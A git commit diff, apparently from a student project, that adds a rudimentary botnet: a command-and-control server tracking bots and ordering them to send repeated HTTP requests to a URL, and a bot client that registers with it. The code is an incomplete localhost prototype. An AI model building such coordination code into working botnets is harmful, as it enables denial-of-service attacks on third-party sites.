44c7bb4c6042484330658946aa426167667df831
uniRomitoskj <romito.1932500@studenti.uniroma1.it>
2023-05-08 21:35:06 +0200

    cutto cutto cutto 3

--- CnC.py
+++ CnC.py
@@ -1,12 +1,66 @@
-import http.server
+import requests
+import socket
+import json
 
-def control_menu:
-    choice = None
 
-    while choice != 0:
-        pass
+class CnC:
+    """
+    Command & Control center of the botnet.
+    """
 
+    def __init__(self, host, port):
+        self.address = (host, port)
+        self.bots = []
+        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.socket.bind(self.address)
+        self.socket.listen(10)
+
+    def run(self):
+        print("Running...")
+
+        while True:
+            client, address = self.socket.accept()
+            address = address[0]
+            data = client.recv(1024)
+            if data == b"new":
+                self.bots.append(address)
+                print(f"bot {address} added")
+                self.send_requests('https://google.com', 3)
+            elif data == b"close":
+                try:
+                    self.bots.remove(address)
+                    print(f"bot {address} removed")
+                except ValueError:
+                    print(f"{address} not in bot list")
+            else:
+                raise RuntimeError("Bot message not recognized")
+            client.close()
+            print(self.list_clients())
+
+    def send_requests(self, url, n):
+        if len(self.bots) == 0:
+            raise RuntimeError("No bot connected.")
+
+        for client in self.bots:
+            requests.post(f"http://{client}:80", json={'url': url, 'n': n})
+
+    def list_clients(self):
+        if self.bots:
+            return "Bots connected:\n" + "\n".join([f"- {b}" for b in self.bots])
+        return "No bots connected"
+
+    def control_menu(self):
+        choice = None
+
+        while choice != 0:
+            pass
+
+
+HOST = '127.0.0.1'
+PORT = 60000
 
 if __name__ == '__main__':
-    print('cioa')
+    cnc = CnC(HOST, PORT)
+    cnc.run()
 
+    # bot.send_requests('https://google.com', 3)
--- bot.py
+++ bot.py
@@ -1,31 +1,51 @@
 import requests
 import socket
 import json
+import atexit
+
 
 class Bot:
 
-    def _init_(self, host, port):
-        self.address = (host, port)
-        self.clients = []
+    def __init__(self, cnc_addr, cnc_port):
+        self.address = (cnc_addr, cnc_port)
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.socket.bind(self.address)
         self.socket.listen(10)
 
 
-    def run(self):
-        pass
-
+    def request_handler(self, req):
+        print(req)
 
     def send_requests(self, url, n):
         for _ in range(n):
             response = requests.get(url)
-            print(response.status_code)
+            print(f"Response status code: {response.status_code}")
+
+    def deamon(self):
+        while True:
+            client, address = self.socket.accept()
+            request = client.recv(1024)
+            self.request_handler(request)
+            client.close()
 
 
-HOST = '127.0.0.1'
-PORT = 80
+
+CNC_ADDR = "127.0.0.1"
+CNC_PORT = 60000
+
+
+def exit_handler():
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((CNC_ADDR, CNC_PORT))
+        s.send(b"close")
+        print("Connection closed")
+
 
 if __name__ == '__main__':
-    pass
-
-    # bot.send_requests('https://google.com', 3)
+    atexit.register(exit_handler)
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((CNC_ADDR, CNC_PORT))
+        s.send(b"new")
+        print("Connected to the Command & Control")
+    bot = Bot("127.0.0.1", 80)
+    bot.deamon()
